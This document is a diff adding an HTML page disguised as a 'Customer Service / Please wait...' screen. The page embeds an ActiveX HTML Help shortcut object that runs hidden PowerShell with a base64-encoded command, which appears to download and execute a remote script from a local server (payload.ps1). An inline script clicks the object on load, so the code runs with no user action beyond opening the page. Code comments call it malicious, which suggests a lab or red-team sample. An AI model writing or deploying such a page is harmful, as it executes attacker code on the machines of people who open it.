@@ -1,0 +1,30 @@
+<html>
+  <head>
+    <title>Customer Service</title>
+  </head>
+
+  <body>
+    <h2 align="center">Customer Service</h2>
+    <h3 align="center">Please wait...</h3>
+
+    <!-- Malicious COM object -->
+    <object 
+      id="shortcut" 
+      classid="clsid:52a2aaae-085d-4187-97ea-8c30db990436" 
+      width="1" 
+      height="1">
+      
+      <!-- Set the command type -->
+      <param name="Command" value="ShortCut">
+
+      <!-- Launch PowerShell with obfuscated payload -->
+      <param name="Item1" value=",powershell.exe, -w 1 -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA4ADAAMAAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA= ">
+      
+    </object>
+
+    <!-- Trigger execution -->
+    <script>
+      shortcut.Click();
+    </script>
+  </body>
+</html>
